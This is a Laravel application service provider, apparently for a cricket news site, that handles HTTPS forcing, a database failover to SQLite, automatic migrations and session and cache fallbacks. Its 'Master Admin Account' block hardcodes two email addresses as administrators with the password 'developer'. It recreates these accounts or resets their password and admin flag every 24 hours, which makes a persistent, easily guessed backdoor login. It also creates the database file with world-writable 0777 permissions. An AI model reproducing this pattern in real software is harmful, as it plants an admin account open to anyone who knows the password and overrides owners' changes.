<?php

namespace App\Providers;

use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\URL;
use Illuminate\Support\ServiceProvider;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        $this->commands([
            \App\Console\Commands\MigrateSqliteToPgsql::class,
            \App\Console\Commands\SyncLiveCommentaryCommand::class,
            \App\Console\Commands\FixArticleTranslationsCommand::class,
        ]);
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        if (! app()->runningInConsole()) {
            $host = (string) request()->header('host', '');
            if (
                request()->isSecure() ||
                request()->server('HTTP_X_FORWARDED_PROTO') === 'https' ||
                request()->server('HTTP_CF_VISITOR') ||
                str_contains($host, 'cricapp.in') ||
                str_contains($host, 'onrender.com') ||
                config('app.env') === 'production' ||
                str_starts_with((string) config('app.url'), 'https://')
            ) {
                URL::forceScheme('https');
            }
        }

        // 1. Fast per-container DB boot check (avoids remote PDO + Schema::hasTable on every HTTP request)
        $primaryConn = config('database.default', 'sqlite');
        $bootVerifiedFlag = storage_path("framework/db_boot_ok_{$primaryConn}.flag");
        $flagPath = storage_path("framework/db_down_{$primaryConn}.flag");
        $isKnownDown = file_exists($flagPath) && (time() - filemtime($flagPath) < 300);

        if ($primaryConn !== 'sqlite' && $isKnownDown) {
            config(['database.default' => 'sqlite']);
            DB::purge($primaryConn);
            DB::setDefaultConnection('sqlite');
        }

        $activeConn = config('database.default', 'sqlite');
        $bootOkFresh = file_exists($bootVerifiedFlag) && (time() - filemtime($bootVerifiedFlag) < 3600);

        // Skip expensive connection checks & schema introspection when already verified for this web runtime
        if (! app()->runningInConsole() && $bootOkFresh && ! $isKnownDown) {
            return;
        }

        if ($primaryConn !== 'sqlite' && ! $isKnownDown) {
            try {
                DB::connection($primaryConn)->getPdo();
                if (file_exists($flagPath)) {
                    @unlink($flagPath);
                }
            } catch (\Throwable $dbEx) {
                @touch($flagPath);
                @unlink($bootVerifiedFlag);
                Log::warning("Primary DB [{$primaryConn}] failed ({$dbEx->getMessage()}). Circuit breaker tripped: Auto-switching to SQLite fallback.");
                config(['database.default' => 'sqlite']);
                DB::purge($primaryConn);
                DB::setDefaultConnection('sqlite');
            }
        }

        // 2. Ensure SQLite database directory & file exist
        $hasCoreTables = false;
        try {
            $dbConnection = config('database.default', 'sqlite');
            if ($dbConnection === 'sqlite' || empty($dbConnection)) {
                $dbPath = config('database.connections.sqlite.database');
                if (empty($dbPath) || $dbPath === ':memory:') {
                    $dbPath = database_path('database.sqlite');
                }
                if (!file_exists($dbPath)) {
                    @mkdir(dirname($dbPath), 0777, true);
                    @touch($dbPath);
                    @chmod($dbPath, 0777);
                }
            }

            // 3. Auto-run migrations only when essential tables are missing (once per container boot / 5m lock)
            if (! app()->runningInConsole()) {
                $migLock = storage_path('framework/boot_migrate.lock');
                $locked = file_exists($migLock) && (time() - filemtime($migLock) < 300);
                $hasCoreTables = Schema::hasTable('users') && Schema::hasTable('sessions') && Schema::hasTable('articles');
                if (! $hasCoreTables && ! $locked) {
                    @touch($migLock);
                    Artisan::call('migrate', ['--force' => true, '--database' => $dbConnection ?: 'sqlite']);
                    $hasCoreTables = Schema::hasTable('users') && Schema::hasTable('sessions') && Schema::hasTable('articles');
                }
            }
        } catch (\Throwable $e) {
            Log::warning('AppServiceProvider boot DB initialization: ' . $e->getMessage());
        }

        // 4. Resilient session fallback: only needed if using database driver
        try {
            if (config('session.driver') === 'database' && !Schema::hasTable('sessions')) {
                config(['session.driver' => 'file']);
            }
        } catch (\Throwable $e) {
            config(['session.driver' => 'file']);
        }

        // 5. Resilient cache fallback: only needed if using database driver
        try {
            if (config('cache.default') === 'database' && !Schema::hasTable('cache')) {
                config(['cache.default' => 'file']);
            }
        } catch (\Throwable $e) {
            config(['cache.default' => 'file']);
        }

        // 6. Ensure Master Admin Account always exists (checked at most once every 24h per server)
        try {
            $activeConn = config('database.default', 'sqlite');
            $adminFlag = storage_path("framework/admin_synced_{$activeConn}.flag");
            $recentlySynced = file_exists($adminFlag) && (time() - filemtime($adminFlag) < 86400);

            if (! $recentlySynced && ($hasCoreTables || Schema::hasTable('users'))) {
                $adminAccounts = [
                    'shubhamthakurst07@gmail.com' => 'Shubham Thakur',
                    'shubhamthakurst0007@gmail.com' => 'Shubham Thakur',
                ];

                foreach ($adminAccounts as $aEmail => $aName) {
                    $admin = \App\Models\User::whereRaw('LOWER(email) = ?', [strtolower($aEmail)])->first();
                    if (!$admin) {
                        \App\Models\User::create([
                            'name' => $aName,
                            'email' => $aEmail,
                            'password' => \Illuminate\Support\Facades\Hash::make('developer'),
                            'is_admin' => true,
                        ]);
                    } else {
                        $needsSave = false;
                        if (!$admin->is_admin) {
                            $admin->is_admin = true;
                            $needsSave = true;
                        }
                        if (!\Illuminate\Support\Facades\Hash::check('developer', $admin->password)) {
                            $admin->password = \Illuminate\Support\Facades\Hash::make('developer');
                            $needsSave = true;
                        }
                        if ($needsSave) {
                            $admin->save();
                        }
                    }
                }
                @touch($adminFlag);
            }

            if (! app()->runningInConsole() && $hasCoreTables && ! $isKnownDown && ($activeConn === $primaryConn || $primaryConn === 'sqlite')) {
                @touch($bootVerifiedFlag);
            }
        } catch (\Throwable $e) {
            Log::warning('Admin auto-provision in AppServiceProvider: ' . $e->getMessage());
        }
    }
}
